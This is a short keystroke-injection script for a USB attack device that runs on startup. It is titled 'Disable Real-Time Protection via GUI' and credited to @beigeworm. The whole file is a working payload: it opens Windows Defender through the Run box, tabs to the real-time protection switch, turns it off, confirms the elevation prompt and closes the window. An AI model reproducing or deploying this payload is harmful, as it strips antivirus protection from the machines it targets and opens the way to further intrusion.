// =============================================================================
// Title: Disable Real-Time Protection via GUI
// Author: @beigeworm | https://github.com/beigeworm
// Description: Disable Real-Time Protection via the Windows Defender GUI.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// =============================================================================

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
delay(1000)
press("GUI r") 
delay(1000) 
type("windowsdefender:")
delay(200)
press("ENTER") 
delay(5000)
press("ENTER")
delay(1500)
press("TAB")
delay(300)
press("TAB")
delay(300)
press("TAB")
delay(300)
press("TAB")
delay(300)
press("ENTER")
delay(1500)
press("SPACEBAR")
delay(2500)
press("ALT y")
delay(3000)
press("ALT F4")
